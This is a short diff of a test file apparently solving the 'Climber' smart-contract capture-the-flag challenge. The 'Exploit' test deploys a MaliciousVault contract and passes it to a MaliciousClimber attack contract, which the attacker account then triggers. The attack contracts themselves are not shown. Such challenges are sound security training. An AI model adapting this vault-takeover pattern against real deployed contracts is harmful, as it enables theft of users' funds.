@@ -52,8 +52,9 @@ describe('[Challenge] Climber', function () {
     });
 
     it('Exploit', async function () {        
+        this.mVault = await (await ethers.getContractFactory('MaliciousVault', attacker)).deploy();
         this.malicious = await (await ethers.getContractFactory('MaliciousClimber', attacker)).deploy(
-            this.vault.owner(), this.vault.address, this.token.address);
+            this.vault.owner(), this.vault.address, this.token.address, this.mVault.address);
         await this.malicious.connect(attacker).attack();
     });
 
